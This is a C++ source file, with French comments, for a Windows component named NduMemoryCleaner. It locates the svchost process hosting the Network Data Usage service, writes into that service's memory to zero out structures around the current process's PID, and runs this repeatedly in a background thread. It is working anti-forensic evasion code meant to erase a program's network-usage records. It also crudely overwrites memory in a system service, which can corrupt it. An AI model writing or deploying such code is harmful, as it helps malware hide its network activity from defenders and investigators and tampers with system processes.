#include "../../includes/security/NduMemoryCleaner.h"
#include <windows.h>
#include <tlhelp32.h>
#include <cstring>

// Variables statiques pour le mode actif
volatile bool NduMemoryCleaner::activeCleaningRunning = false;
void* NduMemoryCleaner::activeCleaningThreadHandle = nullptr;
uint32_t NduMemoryCleaner::cleaningIntervalMs = 500;

bool NduMemoryCleaner::ClearCurrentProcessStats() {
    uint32_t currentPid = GetCurrentProcessId();
    return ClearProcessStats(currentPid);
}

bool NduMemoryCleaner::ClearProcessStats(uint32_t targetPid) {
    // 1. Trouver le svchost.exe qui héberge NDU
    uint32_t nduHostPid = FindNduServiceHost();
    if (nduHostPid == 0) {
        return false;
    }

    // 2. Ouvrir le processus avec tous les droits
    HANDLE hProcess = OpenProcess(
        PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_QUERY_INFORMATION,
        FALSE,
        nduHostPid
    );

    if (!hProcess) {
        return false;
    }

    // 3. Scanner et effacer la mémoire
    bool result = ScanAndClearMemory(hProcess, targetPid);

    // 4. Fermer le handle
    CloseHandle(hProcess);

    return result;
}

uint32_t NduMemoryCleaner::FindNduServiceHost() {
    // Utiliser CreateToolhelp32Snapshot pour énumérer les processus
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        return 0;
    }

    PROCESSENTRY32W pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32W);

    if (!Process32FirstW(hSnapshot, &pe32)) {
        CloseHandle(hSnapshot);
        return 0;
    }

    uint32_t nduPid = 0;
    do {
        // Chercher tous les svchost.exe
        if (lstrcmpiW(pe32.szExeFile, L"svchost.exe") == 0) {
            // Ouvrir le processus pour vérifier s'il héberge NDU
            HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pe32.th32ProcessID);
            if (hProcess) {
                // Scanner la mémoire pour la signature "Ndu"
                uint8_t buffer[4096];
                SIZE_T bytesRead = 0;

                // Chercher dans les premières régions mémoire
                for (uintptr_t address = 0x10000; address < 0x7FFFFFFF; address += 0x10000) {
                    if (ReadProcessMemory(hProcess, (LPCVOID)address, buffer, sizeof(buffer), &bytesRead)) {
                        if (bytesRead > 0) {
                            // Chercher la signature "Ndu"
                            for (SIZE_T i = 0; i < bytesRead - 3; i++) {
                                if (buffer[i] == 'N' && buffer[i+1] == 'd' && buffer[i+2] == 'u') {
                                    nduPid = pe32.th32ProcessID;
                                    CloseHandle(hProcess);
                                    CloseHandle(hSnapshot);
                                    return nduPid;
                                }
                            }
                        }
                    }

                    // Limiter le scan pour éviter de prendre trop de temps
                    if (address > 0x1000000) break;
                }

                CloseHandle(hProcess);
            }
        }
    } while (Process32NextW(hSnapshot, &pe32));

    CloseHandle(hSnapshot);
    return nduPid;
}

bool NduMemoryCleaner::ScanAndClearMemory(void* hProcess, uint32_t targetPid) {
    bool foundAndCleared = false;

    // Scanner toutes les régions mémoire du processus
    for (uintptr_t address = 0; address < 0x7FFFFFFF; address += 0x10000) {
        MEMORY_BASIC_INFORMATION mbi = { 0 };

        if (VirtualQueryEx(hProcess, (LPCVOID)address, &mbi, sizeof(mbi)) == 0) {
            break;
        }

        // Chercher dans les pages RW (lecture/écriture) car les stats sont modifiables
        if ((mbi.State == MEM_COMMIT) &&
            (mbi.Protect == PAGE_READWRITE || mbi.Protect == PAGE_EXECUTE_READWRITE)) {

            if (FindAndClearStatsStructures(hProcess, (uint8_t*)mbi.BaseAddress, (uint32_t)mbi.RegionSize, targetPid)) {
                foundAndCleared = true;
            }
        }

        address = (uintptr_t)mbi.BaseAddress + mbi.RegionSize;
    }

    return foundAndCleared;
}

bool NduMemoryCleaner::FindAndClearStatsStructures(void* hProcess, uint8_t* regionBase, uint32_t regionSize, uint32_t targetPid) {
    if (regionSize > 10 * 1024 * 1024) {
        return false; // Ignorer les régions trop grandes
    }

    // Allouer buffer pour lire la région
    uint8_t* buffer = new uint8_t[regionSize];
    if (!buffer) return false;

    SIZE_T bytesRead = 0;
    if (!ReadProcessMemory(hProcess, regionBase, buffer, regionSize, &bytesRead) || bytesRead == 0) {
        delete[] buffer;
        return false;
    }

    bool found = false;

    // Chercher le PID dans la mémoire (aligné sur 4 bytes)
    for (uint32_t i = 0; i < bytesRead - sizeof(uint32_t); i += 4) {
        uint32_t* pidPtr = (uint32_t*)(buffer + i);

        if (*pidPtr == targetPid) {
            // Trouvé une occurrence du PID - vérifier le contexte
            // Les structures de stats réseau contiennent généralement:
            // - PID (4 bytes)
            // - BytesSent (8 bytes)
            // - BytesReceived (8 bytes)
            // - Timestamp, etc.

            // Effacer une zone de ~256 bytes autour du PID trouvé
            uint32_t clearStart = (i > 128) ? (i - 128) : 0;
            uint32_t clearEnd = ((i + 256) < bytesRead) ? (i + 256) : (uint32_t)bytesRead;

            // Zeroing la zone
            std::memset(buffer + clearStart, 0, clearEnd - clearStart);

            // Écrire la mémoire modifiée
            SIZE_T bytesWritten = 0;
            if (WriteProcessMemory(hProcess, regionBase + clearStart, buffer + clearStart, clearEnd - clearStart, &bytesWritten)) {
                found = true;
            }
        }
    }

    delete[] buffer;
    return found;
}

bool NduMemoryCleaner::StartActiveCleaning(uint32_t intervalMs) {
    // Vérifier si déjà en cours
    if (activeCleaningRunning) {
        return false;
    }

    cleaningIntervalMs = intervalMs;
    activeCleaningRunning = true;

    // Créer le thread de nettoyage
    DWORD threadId = 0;
    activeCleaningThreadHandle = CreateThread(
        nullptr,
        0,
        ActiveCleaningThread,
        nullptr,
        0,
        &threadId
    );

    if (!activeCleaningThreadHandle) {
        activeCleaningRunning = false;
        return false;
    }

    return true;
}

void NduMemoryCleaner::StopActiveCleaning() {
    if (!activeCleaningRunning) {
        return;
    }

    // Signaler l'arrêt
    activeCleaningRunning = false;

    // Attendre que le thread se termine (max 2 secondes)
    if (activeCleaningThreadHandle) {
        WaitForSingleObject(activeCleaningThreadHandle, 2000);
        CloseHandle(activeCleaningThreadHandle);
        activeCleaningThreadHandle = nullptr;
    }
}

bool NduMemoryCleaner::IsActiveCleaning() {
    return activeCleaningRunning;
}

unsigned long __stdcall NduMemoryCleaner::ActiveCleaningThread(void* param) {
    uint32_t currentPid = GetCurrentProcessId();

    while (activeCleaningRunning) {
        // Nettoyer les stats
        ClearProcessStats(currentPid);

        // Attendre l'intervalle
        Sleep(cleaningIntervalMs);
    }

    return 0;
}